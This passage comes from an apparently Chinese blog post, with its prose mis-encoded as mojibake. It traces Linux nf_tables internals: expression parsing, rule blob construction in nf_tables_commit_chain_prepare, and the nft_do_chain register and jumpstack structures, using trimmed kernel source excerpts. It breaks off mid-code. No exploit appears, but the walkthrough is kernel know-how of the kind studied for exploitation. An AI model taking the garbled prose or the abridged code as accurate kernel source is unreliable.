<strong>nf_tables_newexpr</strong> åˆ›å»ºæ¯ä¸€ä¸ªexpression</li></ul><p>éœ€è¦å…³æ³¨ <strong>nf_tables_expr_parse</strong> å’Œ <strong>nf_tables_newexpr</strong> ä¸¤ä¸ªå‡½æ•°</p><ul><li><p><strong>nf_tables_expr_parse</strong> å‡½æ•°åˆå§‹åŒ– <strong>nft_expr_info</strong> ç»“æ„ä½“</p><ul><li><p>é¦–å…ˆéœ€è¦æ ¹æ®NFTA_EXPR_NAMEè·å– <strong>nft_expr_type</strong></p><p>æœ€ç»ˆè°ƒç”¨çš„æ˜¯ <strong>__nft_expr_type_get</strong> å‡½æ•°ï¼Œä» <strong>nf_tables_expressions</strong> ä¸­è·å–ï¼ˆå¯¹æ¯”nameï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_type</span> *__<span class="hljs-title">nft_expr_type_get</span>(<span class="hljs-title">u8</span> <span class="hljs-title">family</span>,</span><br><span class="hljs-class">       <span class="hljs-keyword">struct</span> <span class="hljs-title">nlattr</span> *<span class="hljs-title">nla</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_type</span> *<span class="hljs-title">type</span>, *<span class="hljs-title">candidate</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>list_for_each_entry(type, &amp;nf_tables_expressions, <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-keyword">if</span> (!nla_strcmp(nla, type-&gt;name)) &#123;<br><span class="hljs-keyword">if</span> (!type-&gt;family &amp;&amp; !candidate)<br>candidate = type;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type-&gt;family == family)<br>candidate = type;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> candidate;<br>&#125;<br></code></pre></td></tr></table></figure><p>nf_tables_expressionsçš„åˆå§‹åŒ–ä¹Ÿåœ¨nf_tables_module_initä¸­ï¼Œå°±æ˜¯æŠŠ <strong>nft_basic_types</strong> æ•°ç»„çš„æ‰€æœ‰å…ƒç´ é“¾è¿›é“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_type</span> *<span class="hljs-title">nft_basic_types</span>[] =</span> &#123;<br>&amp;nft_imm_type,<br>&amp;nft_cmp_type,<br>&amp;nft_lookup_type,<br>&amp;nft_bitwise_type,<br>&amp;nft_byteorder_type,<br>&amp;nft_payload_type,<br>&amp;nft_dynset_type,<br>&amp;nft_range_type,<br>&amp;nft_meta_type,<br>&amp;nft_rt_type,<br>&amp;nft_exthdr_type,<br>&amp;nft_last_type,<br>&amp;nft_counter_type,<br>&#125;;<br></code></pre></td></tr></table></figure><p>ä¸¾ä¸ªæ —å­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_type</span> <span class="hljs-title">nft_imm_type</span> __<span class="hljs-title">read_mostly</span> =</span> &#123;<br>.name= <span class="hljs-string">&quot;immediate&quot;</span>,<br>.ops= &amp;nft_imm_ops,<br>.policy= nft_immediate_policy,<br>.maxattr= NFTA_IMMEDIATE_MAX,<br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>infoçš„opså³typeçš„ops</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nf_tables_expr_parse</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx,</span><br><span class="hljs-params"><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *nla,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> nft_expr_info *info)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_type</span> *<span class="hljs-title">type</span>;</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_ops</span> *<span class="hljs-title">ops</span>;</span><br><br><br>    type = nft_expr_type_get(ctx-&gt;net, ctx-&gt;family, tb[NFTA_EXPR_NAME]);<br><br><br>    ops = type-&gt;ops;<br><br><br>    info-&gt;ops = ops;<br><br><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>nf_tables_newexpr</strong> å°†infoçš„opsèµ‹å€¼ç»™exprï¼Œç„¶åè°ƒç”¨init</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nf_tables_newexpr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx,</span><br><span class="hljs-params">     <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_expr_info *expr_info,</span><br><span class="hljs-params">     <span class="hljs-keyword">struct</span> nft_expr *expr)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_ops</span> *<span class="hljs-title">ops</span> =</span> expr_info-&gt;ops;<br><span class="hljs-type">int</span> err;<br><br>expr-&gt;ops = ops;<br><span class="hljs-keyword">if</span> (ops-&gt;init) &#123;<br>err = ops-&gt;init(ctx, expr, (<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr **)expr_info-&gt;tb);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err1;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>err1:<br>expr-&gt;ops = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="nft-do-chainæ‰§è¡Œå‘½ä»¤"><a href="#nft-do-chainæ‰§è¡Œå‘½ä»¤" class="headerlink" title="nft_do_chainæ‰§è¡Œå‘½ä»¤"></a>nft_do_chainæ‰§è¡Œå‘½ä»¤</h3><h4 id="nft-rule-dpçš„å‡†å¤‡"><a href="#nft-rule-dpçš„å‡†å¤‡" class="headerlink" title="nft_rule_dpçš„å‡†å¤‡"></a>nft_rule_dpçš„å‡†å¤‡</h4><p>nft_do_chainä¸­çš„ruleä½¿ç”¨çš„éƒ½æ˜¯nft_rule_dpè€Œä¸æ˜¯nft_ruleï¼Œä½†nf_tables_newruleåªåˆ›å»ºäº†nft_rule</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">nft_do_chain</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nft_pktinfo *pkt, <span class="hljs-type">void</span> *priv)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span> *<span class="hljs-title">chain</span> =</span> priv, *basechain = chain;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_dp</span> *<span class="hljs-title">rule</span>, *<span class="hljs-title">last_rule</span>;</span><br><br>    <br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr</span> *<span class="hljs-title">expr</span>, *<span class="hljs-title">last</span>;</span><br><br>    <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_blob</span> *<span class="hljs-title">blob</span>;</span><br><br>    <br>do_chain:<br><span class="hljs-keyword">if</span> (genbit)<br>blob = rcu_dereference(chain-&gt;blob_gen_1);<br><span class="hljs-keyword">else</span><br>blob = rcu_dereference(chain-&gt;blob_gen_0);<br><br>rule = (<span class="hljs-keyword">struct</span> nft_rule_dp *)blob-&gt;data;<br>last_rule = (<span class="hljs-type">void</span> *)blob-&gt;data + blob-&gt;size;<br>next_rule:<br>regs.verdict.code = NFT_CONTINUE;<br><span class="hljs-keyword">for</span> (; rule &lt; last_rule; rule = nft_rule_next(rule)) &#123;<br>nft_rule_dp_for_each_expr(expr, last, rule) &#123;<br>    <br>    <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_blob</span>__<span class="hljs-title">rcu</span> *<span class="hljs-title">blob_gen_0</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_blob</span>__<span class="hljs-title">rcu</span> *<span class="hljs-title">blob_gen_1</span>;</span><br><br>    <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_blob</span>*<span class="hljs-title">blob_next</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_blob</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>size;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>data[]<br>__attribute__((aligned(__alignof__(<span class="hljs-keyword">struct</span> nft_rule_dp))));<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_dp</span> &#123;</span><br>u64is_last:<span class="hljs-number">1</span>,<br>dlen:<span class="hljs-number">12</span>,<br>handle:<span class="hljs-number">42</span>;<span class="hljs-comment">/* for tracing */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>data[]<br>__attribute__((aligned(__alignof__(<span class="hljs-keyword">struct</span> nft_expr))));<br>&#125;;<br></code></pre></td></tr></table></figure><p>nft_rule_blobç»“æ„ä½“çš„èµ‹å€¼åœ¨ <strong>nf_tables_commit_chain_prepare</strong> ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nf_tables_commit_chain_prepare</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> nft_chain *chain)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr</span> *<span class="hljs-title">expr</span>, *<span class="hljs-title">last</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_regs_track</span> <span class="hljs-title">track</span> =</span> &#123;&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, data_size;<br><span class="hljs-type">void</span> *data, *data_boundary;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_dp</span> *<span class="hljs-title">prule</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule</span> *<span class="hljs-title">rule</span>;</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 1. åˆ¤æ–­æ˜¯å¦å·²ç»èµ‹å€¼</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (chain-&gt;blob_next || !nft_is_active_next(net, chain))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. è®¡ç®—æ‰€éœ€å¤§å°</span><br><span class="hljs-comment">     */</span><br>rule = list_entry(&amp;chain-&gt;rules, <span class="hljs-keyword">struct</span> nft_rule, <span class="hljs-built_in">list</span>);<br><br>data_size = <span class="hljs-number">0</span>;<br>list_for_each_entry_continue(rule, &amp;chain-&gt;rules, <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-keyword">if</span> (nft_is_active_next(net, rule)) &#123;<br>data_size += <span class="hljs-keyword">sizeof</span>(*prule) + rule-&gt;dlen;<br><span class="hljs-keyword">if</span> (data_size &gt; INT_MAX)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br>&#125;<br>data_size += offsetof(<span class="hljs-keyword">struct</span> nft_rule_dp, data);<span class="hljs-comment">/* last rule */</span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 3. åˆ›å»ºnft_rule_blob</span><br><span class="hljs-comment">     */</span><br>chain-&gt;blob_next = nf_tables_chain_alloc_rules(data_size);<br><span class="hljs-keyword">if</span> (!chain-&gt;blob_next)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>data = (<span class="hljs-type">void</span> *)chain-&gt;blob_next-&gt;data;<br>data_boundary = data + data_size;<br>size = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 4. å°†æ‰€æœ‰exprçš„å†…å®¹å¤åˆ¶åˆ°nft_rule_blobä¸­</span><br><span class="hljs-comment">     */</span><br>list_for_each_entry_continue(rule, &amp;chain-&gt;rules, <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-keyword">if</span> (!nft_is_active_next(net, rule))<br><span class="hljs-keyword">continue</span>;<br><br>prule = (<span class="hljs-keyword">struct</span> nft_rule_dp *)data;<br>data += offsetof(<span class="hljs-keyword">struct</span> nft_rule_dp, data);<br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(data &gt; data_boundary))<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>size = <span class="hljs-number">0</span>;<br>track.last = nft_expr_last(rule);<br>nft_rule_for_each_expr(expr, last, rule) &#123;<br>track.cur = expr;<br><br><span class="hljs-keyword">if</span> (nft_expr_reduce(&amp;track, expr)) &#123;<br>expr = track.cur;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(data + expr-&gt;ops-&gt;size &gt; data_boundary))<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br><span class="hljs-built_in">memcpy</span>(data + size, expr, expr-&gt;ops-&gt;size);<br>size += expr-&gt;ops-&gt;size;<br>&#125;<br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(size &gt;= <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">12</span>))<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>prule-&gt;handle = rule-&gt;handle;<br>prule-&gt;dlen = size;<br>prule-&gt;is_last = <span class="hljs-number">0</span>;<br><br>data += size;<br>size = <span class="hljs-number">0</span>;<br>chain-&gt;blob_next-&gt;size += (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(data - (<span class="hljs-type">void</span> *)prule);<br>&#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 5. æ ‡è®°islast</span><br><span class="hljs-comment">     */</span><br>prule = (<span class="hljs-keyword">struct</span> nft_rule_dp *)data;<br>data += offsetof(<span class="hljs-keyword">struct</span> nft_rule_dp, data);<br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(data &gt; data_boundary))<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>nft_last_rule(chain-&gt;blob_next, prule);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>nf_tables_commit_chain_prepareåœ¨nf_tables_commitä¸­è¢«è°ƒç”¨</p></li><li><p>nf_tables_commitæ˜¯nf_tables_subsysçš„commitæˆå‘˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nfnetlink_subsystem</span> <span class="hljs-title">nf_tables_subsys</span> =</span> &#123;<br>.name= <span class="hljs-string">&quot;nf_tables&quot;</span>,<br>.subsys_id= NFNL_SUBSYS_NFTABLES,<br>.cb_count= NFT_MSG_MAX,<br>.cb= nf_tables_cb,<br>.commit= nf_tables_commit,<br>.<span class="hljs-built_in">abort</span>= nf_tables_abort,<br>.cleanup= nf_tables_cleanup,<br>.valid_genid= nf_tables_valid_genid,<br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>nfnetlink_rcv_batchä¸­è°ƒç”¨äº†commitï¼Œè¡¨ç¤ºæäº¤æ›´æ”¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (status == NFNL_BATCH_DONE) &#123;<br>err = ss-&gt;commit(net, oskb);<br><span class="hljs-keyword">if</span> (err == -EAGAIN) &#123;<br>status |= NFNL_BATCH_REPLAY;<br><span class="hljs-keyword">goto</span> done;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (err) &#123;<br>ss-&gt;<span class="hljs-built_in">abort</span>(net, oskb, NFNL_ABORT_NONE);<br>netlink_ack(oskb, nlmsg_hdr(oskb), err, <span class="hljs-literal">NULL</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="nft-do-chain"><a href="#nft-do-chain" class="headerlink" title="nft_do_chain"></a>nft_do_chain</h4><p>ä¹‹å‰æåˆ°çš„æ³¨å†Œçš„hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">.hooks= &#123;<br>[NF_INET_LOCAL_IN]= nft_do_chain_ipv4,<br>[NF_INET_LOCAL_OUT]= nft_do_chain_ipv4,<br>[NF_INET_FORWARD]= nft_do_chain_ipv4,<br>[NF_INET_PRE_ROUTING]= nft_do_chain_ipv4,<br>[NF_INET_POST_ROUTING]= nft_do_chain_ipv4,<br>&#125;,<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆéƒ½æ˜¯è°ƒç”¨nft_do_chain</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_do_chain_ipv4</span><span class="hljs-params">(<span class="hljs-type">void</span> *priv,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> sk_buff *skb,</span><br><span class="hljs-params">      <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_state *state)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_pktinfo</span> <span class="hljs-title">pkt</span>;</span><br><br>nft_set_pktinfo(&amp;pkt, skb, state);<br>nft_set_pktinfo_ipv4(&amp;pkt);<br><br><span class="hljs-keyword">return</span> nft_do_chain(&amp;pkt, priv);<br>&#125;<br></code></pre></td></tr></table></figure><p>regså’Œjumpstackç›¸å…³æ•°æ®ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_jumpstack</span> &#123;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span> *<span class="hljs-title">chain</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_dp</span> *<span class="hljs-title">rule</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_dp</span> *<span class="hljs-title">last_rule</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_regs</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32data[NFT_REG32_NUM];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_verdict</span><span class="hljs-title">verdict</span>;</span><br>&#125;;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_verdict</span> &#123;</span><br>u32code;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span>*<span class="hljs-title">chain</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_registers</span> &#123;</span><br>NFT_REG_VERDICT,<br>NFT_REG_1,<br>NFT_REG_2,<br>NFT_REG_3,<br>NFT_REG_4,<br>__NFT_REG_MAX,<br><br>NFT_REG32_00= <span class="hljs-number">8</span>,<br>NFT_REG32_01,<br>NFT_REG32_02,<br>NFT_REG32_03,<br>NFT_REG32_04,<br>NFT_REG32_05,<br>NFT_REG32_06,<br>NFT_REG32_07,<br>NFT_REG32_08,<br>NFT_REG32_09,<br>NFT_REG32_10,<br>NFT_REG32_11,<br>NFT_REG32_12,<br>NFT_REG32_13,<br>NFT_REG32_14,<br>NFT_REG32_15,<br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NFT_REG_MAX(__NFT_REG_MAX - 1)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NFT_REG_SIZE16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NFT_REG32_SIZE4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NFT_REG32_COUNT(NFT_REG32_15 - NFT_REG32_00 + 1)</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 